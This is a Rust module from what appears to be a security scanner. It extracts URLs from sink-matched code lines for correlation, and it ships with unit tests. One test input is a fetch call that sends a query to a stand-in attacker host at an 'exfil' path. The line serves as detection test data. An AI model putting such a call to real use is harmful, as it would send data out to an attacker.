//! Extract URLs from sink-matched lines during Tier 2 for URL correlation.
//!
//! Extraction rules (plan resolutions):
//!   - If the URL is inside a string literal (single/double/backtick quoted),
//!     extract up to the matching closing quote.
//!   - Otherwise, extract from the http(s) prefix to first whitespace,
//!     `<`, or `>`.
//!
//! Parens are not treated as a terminator since URLs can legitimately
//! contain them.

pub fn extract_urls(line: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        if let Some(url_start) = find_http_prefix(&bytes[i..]) {
            let start = i + url_start;
            let quote = preceding_quote(line, start);
            let end = if let Some(q) = quote {
                find_closing_quote(line, start, q)
                    .unwrap_or_else(|| extent_without_quote(line, start))
            } else {
                extent_without_quote(line, start)
            };
            let url = &line[start..end];
            if looks_like_url(url) {
                let cleaned = url.to_string();
                if !out.contains(&cleaned) {
                    out.push(cleaned);
                }
            }
            i = end;
            continue;
        }
        break;
    }
    out
}

fn find_http_prefix(bytes: &[u8]) -> Option<usize> {
    (0..bytes.len())
        .find(|&w| bytes[w..].starts_with(b"http://") || bytes[w..].starts_with(b"https://"))
}

fn preceding_quote(line: &str, idx: usize) -> Option<char> {
    let bytes = line.as_bytes();
    let mut i = idx;
    while i > 0 {
        i -= 1;
        match bytes[i] {
            b'"' => return Some('"'),
            b'\'' => return Some('\''),
            b'`' => return Some('`'),
            b'\n' => return None,
            _ => {}
        }
    }
    None
}

fn find_closing_quote(line: &str, start: usize, quote: char) -> Option<usize> {
    let bytes = line.as_bytes();
    let target = quote as u8;
    let mut i = start;
    while i < bytes.len() {
        if bytes[i] == target {
            return Some(i);
        }
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            i += 2;
            continue;
        }
        i += 1;
    }
    None
}

fn extent_without_quote(line: &str, start: usize) -> usize {
    let bytes = line.as_bytes();
    for (i, b) in bytes[start..].iter().enumerate() {
        if b.is_ascii_whitespace()
            || *b == b'<'
            || *b == b'>'
            || *b == b'"'
            || *b == b'\''
            || *b == b'`'
        {
            return start + i;
        }
    }
    bytes.len()
}

fn looks_like_url(s: &str) -> bool {
    if !(s.starts_with("http://") || s.starts_with("https://")) {
        return false;
    }
    let rest = if let Some(r) = s.strip_prefix("https://") {
        r
    } else {
        s.strip_prefix("http://").unwrap_or("")
    };
    if rest.is_empty() || rest.starts_with('/') {
        return false;
    }
    let host_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    let host = &rest[..host_end];
    host.contains('.')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn double_quoted_url() {
        let urls = extract_urls(r#"fetch("https://evil.com/exfil?q=1")"#);
        assert_eq!(urls, vec!["https://evil.com/exfil?q=1".to_string()]);
    }

    #[test]
    fn single_quoted_url() {
        let urls = extract_urls("fetch('https://example.com/api')");
        assert_eq!(urls, vec!["https://example.com/api".to_string()]);
    }

    #[test]
    fn backtick_url() {
        let urls = extract_urls("fetch(`https://server.io/v1`)");
        assert_eq!(urls, vec!["https://server.io/v1".to_string()]);
    }

    #[test]
    fn url_with_parens_in_path_is_kept_when_quoted() {
        let urls = extract_urls(r#"fetch("https://x.com/p(a,b)")"#);
        assert_eq!(urls, vec!["https://x.com/p(a,b)".to_string()]);
    }

    #[test]
    fn unquoted_url_terminates_at_whitespace() {
        let urls = extract_urls("visit https://example.com/path next");
        assert_eq!(urls, vec!["https://example.com/path".to_string()]);
    }

    #[test]
    fn http_without_domain_rejected() {
        assert!(extract_urls("http:///relative").is_empty());
        assert!(extract_urls("http:// bad").is_empty());
    }

    #[test]
    fn multiple_urls_same_line() {
        let urls = extract_urls(r#"redirect("https://a.com/x", "https://b.co/y")"#);
        assert_eq!(urls.len(), 2);
        assert_eq!(urls[0], "https://a.com/x");
        assert_eq!(urls[1], "https://b.co/y");
    }

    #[test]
    fn no_url_line_is_empty() {
        assert!(extract_urls("const x = 1;").is_empty());
    }
}
